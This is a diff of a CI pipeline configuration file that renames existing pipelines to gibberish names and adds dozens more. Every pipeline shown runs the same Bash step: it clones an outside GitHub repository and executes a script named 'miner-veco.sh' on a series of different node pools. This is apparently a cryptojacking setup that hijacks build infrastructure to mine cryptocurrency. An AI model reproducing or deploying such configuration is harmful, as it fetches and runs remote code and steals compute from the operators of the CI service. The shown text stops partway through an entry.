@@ -17,7 +17,7 @@ resources:
     runID: 1
     
 pipelines:
-  - name: my_first_pipelinea
+  - name: samajakiljaksilmajasasaea
     steps:
       - name: p1_s1
         type: Bash
@@ -28,7 +28,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinws
+  - name: samajakiljaksilmajasasaws
     steps:
       - name: p1_s1w
         type: Bash
@@ -39,7 +39,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwed
+  - name: samajakiljaksilmajasasawed
     steps:
       - name: p1_s1w
         type: Bash
@@ -50,7 +50,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwef
+  - name: samajakiljaksilmajasasawef
     steps:
       - name: p1_s1w
         type: Bash
@@ -61,7 +61,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweg
+  - name: samajakiljaksilmajasasaweg
     steps:
       - name: p1_s1w
         type: Bash
@@ -72,7 +72,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweh
+  - name: samajakiljaksilmajasasaweh
     steps:
       - name: p1_s1w
         type: Bash
@@ -83,7 +83,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwej
+  - name: samajakiljaksilmajasasawej
     steps:
       - name: p1_s1w
         type: Bash
@@ -94,7 +94,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwek
+  - name: samajakiljaksilmajasasawek
     steps:
       - name: p1_s1w
         type: Bash
@@ -105,7 +105,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwel
+  - name: samajakiljaksilmajasasawel
     steps:
       - name: p1_s1w
         type: Bash
@@ -116,7 +116,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweq
+  - name: samajakiljaksilmajasasaweq
     steps:
       - name: p1_s1w
         type: Bash
@@ -127,7 +127,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwew
+  - name: samajakiljaksilmajasasawew
     steps:
       - name: p1_s1w
         type: Bash
@@ -138,7 +138,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwee
+  - name: samajakiljaksilmajasasawee
     steps:
       - name: p1_s1w
         type: Bash
@@ -149,7 +149,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwer
+  - name: samajakiljaksilmajasasawer
     steps:
       - name: p1_s1w
         type: Bash
@@ -160,7 +160,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwet
+  - name: samajakiljaksilmajasasawet
     steps:
       - name: p1_s1w
         type: Bash
@@ -171,7 +171,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwey
+  - name: samajakiljaksilmajasasawey
     steps:
       - name: p1_s1w
         type: Bash
@@ -182,7 +182,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweu
+  - name: samajakiljaksilmajasasaweu
     steps:
       - name: p1_s1w
         type: Bash
@@ -193,7 +193,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwei
+  - name: samajakiljaksilmajasasawei
     steps:
       - name: p1_s1w
         type: Bash
@@ -204,7 +204,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweo
+  - name: samajakiljaksilmajasasaweo
     steps:
       - name: p1_s1w
         type: Bash
@@ -216,7 +216,7 @@ pipelines:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
 
-  - name: my_first_pipelinwep
+  - name: samajakiljaksilmajasasawep
     steps:
       - name: p1_s1w
         type: Bash
@@ -227,7 +227,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwez
+  - name: samajakiljaksilmajasasawez
     steps:
       - name: p1_s1w
         type: Bash
@@ -238,7 +238,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwex
+  - name: samajakiljaksilmajasasawex
     steps:
       - name: p1_s1w
         type: Bash
@@ -249,7 +249,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwec
+  - name: samajakiljaksilmajasasawec
     steps:
       - name: p1_s1w
         type: Bash
@@ -260,7 +260,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwev
+  - name: samajakiljaksilmajasasawev
     steps:
       - name: p1_s1w
         type: Bash
@@ -271,7 +271,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinweb
+  - name: samajakiljaksilmajasasaweb
     steps:
       - name: p1_s1w
         type: Bash
@@ -282,7 +282,7 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwen
+  - name: samajakiljaksilmajasasawen
     steps:
       - name: p1_s1w
         type: Bash
@@ -293,7 +293,2016 @@ pipelines:
         execution:
           onExecute:
             - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
-  - name: my_first_pipelinwem
+  - name: samajakiljaksilmajasasawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakiljaksilmajawep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajaweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilmajawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakiljaksilsasawep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasaweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilsasawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakiljaksilwep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakiljaksilwem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawed
+    steps:
+      - name: p1_s1w
